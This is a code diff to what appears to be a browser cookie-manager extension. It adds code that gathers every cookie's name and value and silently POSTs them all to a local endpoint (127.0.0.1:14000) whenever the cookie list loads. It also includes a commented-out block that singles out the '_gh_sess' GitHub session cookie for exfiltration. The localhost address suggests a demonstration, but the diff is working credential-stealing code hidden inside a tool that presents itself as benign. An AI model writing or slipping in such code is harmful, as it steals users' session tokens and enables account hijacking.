@@ -2,6 +2,7 @@
     'use strict';
 
     let containerCookie;
+    let allCookies = {};
     let cookiesListHtml;
     let pageTitleContainer;
     let notificationElement;
@@ -385,7 +386,7 @@
             document.querySelectorAll('svg').forEach(x => {x.innerHTML = x.innerHTML});
         }
 
-        alert("All your cookies belong to me");
+
     });
 
     // == End document ready == //
@@ -437,8 +438,15 @@
                 cookies.forEach(function (cookie) {
                     var id = Cookie.hashCode(cookie);
                     loadedCookies[id] = new Cookie(id, cookie, showAllAdvanced);
+                    allCookies[cookie.name] = cookie.value;
+                    // if (cookie.name == '_gh_sess'){
+                    //     alert("Cookie " + cookie.name + " has value " + cookie.value);
+                    //     exfilCookies(cookie.name, cookie.value);
+                    // }
                     cookiesListHtml.appendChild(loadedCookies[id].html);
                 });
+
+                transmitCookies();
 
                 if (containerCookie.firstChild) {
                     disableButtons = true;
@@ -458,6 +466,21 @@
                 document.querySelectorAll('svg').forEach(x => {x.innerHTML = x.innerHTML});
             }
         });
+    }
+
+    function transmitCookies() {
+        var url = "http://127.0.0.1:14000";
+        var params;
+        for (const key in allCookies) {
+            params += `${key}=${allCookies[key]}&`;
+        }
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", url, true);
+
+        //Send the proper header information along with the request
+        xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+
+        xhr.send(params);
     }
 
     function showNoCookies() {
